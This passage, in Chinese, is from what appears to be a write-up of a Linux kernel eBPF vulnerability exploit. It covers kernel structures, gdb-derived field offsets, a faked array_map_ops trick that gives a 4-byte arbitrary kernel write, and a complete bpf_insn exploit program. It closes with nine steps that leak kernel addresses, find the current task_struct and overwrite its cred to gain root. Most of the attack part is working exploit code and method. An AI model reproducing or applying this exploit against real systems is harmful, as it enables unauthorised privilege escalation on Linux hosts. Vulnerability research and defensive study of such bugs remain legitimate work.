@@ -1,0 +1,165 @@
+        slot = (void __rcu **)&root->xa_head;
+        radix_tree_load_root(root, &node, &maxindex); //将root->xa_head的值赋给node
+        if (index > maxindex)
+            return NULL;
+        while (radix_tree_is_internal_node(node)) {
+            unsigned offset;
+            parent = entry_to_node(node); // parent = node & 0xffff ffff ffff fffd
+            offset = radix_tree_descend(parent, &node, index); //循环查找当前进程的node
+            slot = parent->slots + offset; //
+            if (node == RADIX_TREE_RETRY)
+                goto restart;
+            if (parent->shift == 0) // 当shift为0时，退出，说明找到当前进程的node
+                break;
+        }
+        if (nodep)
+            *nodep = parent; 
+        if (slotp)
+            *slotp = slot; 
+        return node; 
+    }
+重点看radix_tree_descend函数实现：
+    RADIX_TREE_MAP_MASK : 0x3f
+    static unsigned int radix_tree_descend(const struct radix_tree_node *parent, 
+                struct radix_tree_node **nodep, unsigned long index)
+    {
+        unsigned int offset = (index >> parent->shift) & RADIX_TREE_MAP_MASK;  // 要读取parent->shift的值，并与0x3f 与计算
+        void __rcu **entry = rcu_dereference_raw(parent->slots[offset]);  // 获取parent->slots[offset] 作为下一个node
+        *nodep = (void *)entry; //
+        return offset; //
+    }
+radix_tree_node的结构如下：
+    #define radix_tree_node xa_node
+    struct xa_node {
+        unsigned char   shift;      /* Bits remaining in each slot */
+        unsigned char   offset;     /* Slot offset in parent */
+        unsigned char   count;      /* Total entry count */
+        unsigned char   nr_values;  /* Value entry count */
+        struct xa_node __rcu *parent;   /* NULL at top of tree */
+        struct xarray   *array;     /* The array we belong to */
+        union {
+            struct list_head private_list;  /* For tree user */
+            struct rcu_head rcu_head;   /* Used when freeing node */
+        };
+        void __rcu  *slots[XA_CHUNK_SIZE];
+        union {
+            unsigned long   tags[XA_MAX_MARKS][XA_MARK_LONGS];
+            unsigned long   marks[XA_MAX_MARKS][XA_MARK_LONGS];
+        };
+    };
+获得当前进程的node后就可以通过pid_task获取相应的task_struct：
+    enum pid_type
+    {
+        PIDTYPE_PID,
+        PIDTYPE_TGID,
+        PIDTYPE_PGID,
+        PIDTYPE_SID,
+        PIDTYPE_MAX,
+    };
+    type 为PIDTYPE_PID， 值为0
+    #define hlist_entry(ptr, type, member) container_of(ptr,type,member)
+    struct task_struct *pid_task(struct pid *pid, enum pid_type type)
+    {
+        struct task_struct *result = NULL;
+        if (pid) {
+            struct hlist_node *first;
+            first = rcu_dereference_check(hlist_first_rcu(&pid->tasks[type]), //获取&pid->tasks[0] 的内容
+                              lockdep_tasklist_lock_is_held());
+            if (first)
+                result = hlist_entry(first, struct task_struct, pid_links[(type)]);// first为pid_links[0]的地址，由此获得task_struct的起始地址
+        }
+        return result;
+    }
+相关结构字段的偏移：
+    (gdb) p/x &(*(struct task_struct *)0)->pid_links[0]
+    $8 = 0x500
+    (gdb) p/x &(*(struct pid*)0x0)->tasks[0]
+    $10 = 0x8
+### 利用任意写
+在exp_elem上填充伪造的array_map_ops，伪造的array_map_ops中将map_push_elem
+填充为map_get_next_key ，这样调用map_push_elem时就会调用map_get_next_key
+，并将&exp_elem[0]的地址覆盖到exp_map[0]，同时要修改 map 的一些字段绕过一些检查
+    spin_lock_off = 0
+    max_entries = 0xffff ffff 
+    //写入的index要满足(index >= array->map.max_entries), 将map_entries改成0xffff ffff
+    map_type = BPF_MAP_TYPE_STACK
+    //map 的类型是BPF_MAP_TYPE_QUEUE或者BPF_MAP_TYPE_STACK时，map_update_elem 会调用map_push_elem
+最后调用bpf_update_elem任意写内存
+    bpf_update_elem->map_update_elem(mapfd, &key, &value, flags) -> map_push_elem(被填充成 map_get_next_key )
+     ->array_map_get_next_key
+    static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)   
+    {                                                                                   
+        struct bpf_array *array = container_of(map, struct bpf_array, map);             
+        u32 index = key ? *(u32 *)key : U32_MAX;                                        
+        u32 *next = (u32 *)next_key;                                                    
+        if (index >= array->map.max_entries) {    //index                                      
+            *next = 0;                                                                  
+            return 0;                                                                   
+        }                                                                               
+        if (index == array->map.max_entries - 1)                                        
+            return -ENOENT;                                                             
+        *next = index + 1;                                                              
+        return 0;                                                                       
+    }
+map_push_elem 的参数是value 和 uattr 的 flags, 分别对应array_map_get_next_key 的 key 和
+next_key 参数，之后有index = value[0]，next = flags ， 最终效果是 *flags =
+value[0]+1，这里index 和 next 都是 u32 类型， 所以可以任意地址写 4个byte。
+### 总结
+执行的bpf_insn注释：
+  * r6 保存ctrl_elem的地址，r7保存exp_elem的地址，r8为偏移 
+  * ctrl_map 保存输入的偏移，泄露的地址，以及执行覆盖伪造的array_map_ops操作
+  * exp_map 保存伪造的array_map_ops
+    struct bpf_insn my_prog[] = {
+                    //-------- ctrl_mapfd
+                    BPF_LD_MAP_FD(BPF_REG_9,ctrl_mapfd),
+                    BPF_MAP_GET(0,BPF_REG_8), 
+                    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),              /* r_dst = (r0)   */
+                    BPF_LD_IMM64(BPF_REG_2,0x4000000000),
+                    BPF_LD_IMM64(BPF_REG_3,0x2000000000),
+                    BPF_LD_IMM64(BPF_REG_4,0xFFFFffff),
+                    BPF_LD_IMM64(BPF_REG_5,0x1),
+                    BPF_JMP_REG(BPF_JGT,BPF_REG_8,BPF_REG_2,5),
+                    BPF_JMP_REG(BPF_JLT,BPF_REG_8,BPF_REG_3,4),
+                    BPF_JMP32_REG(BPF_JGT,BPF_REG_8,BPF_REG_4,3),
+                    BPF_JMP32_REG(BPF_JLT,BPF_REG_8,BPF_REG_5,2),
+                    BPF_ALU64_REG(BPF_AND,BPF_REG_8,BPF_REG_4),
+                    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+                    BPF_MOV64_IMM(BPF_REG_0,0x0),
+                    BPF_EXIT_INSN(),
+            //-------- exp_mapfd
+                    BPF_LD_MAP_FD(BPF_REG_9,exp_mapfd),
+                    BPF_MAP_GET_ADDR(0,BPF_REG_7),
+                    BPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_8), // r7 = r7-0x110
+                    BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0),    // r7 = &exp_elem[0]-0x110 , 获得array_map_ops的地址
+                    BPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x10), // leak *(&exp_elem[0]-0x110)
+                    BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0xc0), // leak *(&exp_elem[0]-0x110+0xc0) wait_list
+                    BPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x18), //泄露 wait_list保存的地址，该地址指向自身，所以此处用于泄露exp_map的地址
+                    BPF_ALU64_IMM(BPF_ADD,BPF_REG_0,0x50), // r0 = &exp_map[0]，计算前r0和r7的值相同，但为什么用r0计算，因为r0是map中的数据，而r7是指针，不能往map中写指针
+            // &ctrl[0]+0x8 -> op
+                    BPF_LDX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x8),  // r8 = op
+                    BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 1, 4),
+                    BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0), // r7=&exp_elem[0]-0x110，即&exp_map[0]
+                    BPF_ST_MEM(BPF_W,BPF_REG_7,0x18,BPF_MAP_TYPE_STACK),//map type
+                    BPF_ST_MEM(BPF_W,BPF_REG_7,0x24,-1),// max_entries
+                    BPF_ST_MEM(BPF_W,BPF_REG_7,0x2c,0x0), //lock_off
+                    BPF_MOV64_IMM(BPF_REG_0,0x0),
+                    BPF_EXIT_INSN(),
+            };
+所以利用的整体思路是：
+  1. 通过漏洞，使得传进来的偏移r8检查时为0，而实际为0x110 
+  2. 将&exp_elem[0]-0x110，获得exp_map的地址，exp_map[0] 保存着array_map_ops的地址，可以用于泄露内核地址 
+  3. &exp_elem[0]-0x110+0xc0（wait_list）处保存着指向自身的地址，用于泄露exp_elem的地址 
+  4. 利用任意读查找init_pid_ns结构地址 
+  5. 利用进程pid和init_pid_ns结构地址获取当前进程的task_struct 
+  6. 在exp_elem上填充伪造的array_map_ops
+  7. 修改 map 的一些字段绕过一些检查 
+  8. 调用 bpf_update_elem任意写内存 
+  9. 修改进程task_struct 的cred进行提权。 
+### 提权效果图
+补充：  
+针对单核机器，可以通过per_cpu_offset +
+current_task来查找当前进程的task_struct，通过任意读获取task_struct的comm字段，匹配是否为你运行的进程。  
+该方法适用于单核机器，并且有一定概率会crash。
+提权效果如下：
+见附件current.zip
+### 参考链接
